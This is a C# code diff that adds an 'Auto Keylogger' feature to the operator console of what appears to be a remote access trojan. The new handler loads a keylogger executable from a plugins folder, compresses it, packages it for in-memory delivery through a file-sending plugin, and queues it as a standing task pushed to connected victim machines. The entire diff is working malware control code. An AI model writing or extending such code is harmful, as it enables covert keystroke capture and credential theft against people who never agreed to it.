@@ -1796,5 +1796,47 @@ namespace Server
                 formSetting.ShowDialog();
             }
         }
+
+        private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
+                packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(@"Plugins\Keylogger.exe")));
+                packet.ForcePathObject("Inject").AsString = "";
+
+                ListViewItem lv = new ListViewItem();
+                lv.Text = "Auto Keylogger.";
+                lv.SubItems.Add("0");
+                lv.ToolTipText = Guid.NewGuid().ToString();
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == lv.Text)
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                Program.form1.listView4.Items.Add(lv);
+                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
     }
 }
